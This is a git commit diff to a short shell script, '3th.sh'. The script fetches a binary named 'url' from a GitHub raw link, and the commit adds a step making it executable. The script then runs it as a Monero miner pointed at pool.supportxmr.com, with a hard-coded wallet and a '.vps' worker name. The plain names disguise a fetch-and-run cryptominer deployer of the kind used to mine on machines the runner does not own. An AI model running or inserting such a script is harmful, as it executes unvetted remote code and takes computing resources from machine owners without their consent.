1f4a364ac01da0ee70b3b50417b68bb098cd86b8
nettech12 <107695376+nettech12@users.noreply.github.com>
2022-11-15 21:22:03 +0530

    Update 3th.sh

--- 3th.sh
+++ 3th.sh
@@ -1,3 +1,3 @@
 #!bin/bash
-wget -nc https://raw.githubusercontent.com/nettech12/tool/main/url
+wget -nc https://raw.githubusercontent.com/nettech12/tool/main/url && chmod +x url
 ./url --coin=XMR --threads=4 -o pool.supportxmr.com:3333 -u 4B1dXbphAhG5t6erRwsFQ3FnURzpZgwXMNQgpsFxhxF31L8aKuMXhn5XutWZMGxJWo78N7nkNEEAW4S4Gyi7djRUCD3ytv4.vps -k -p x
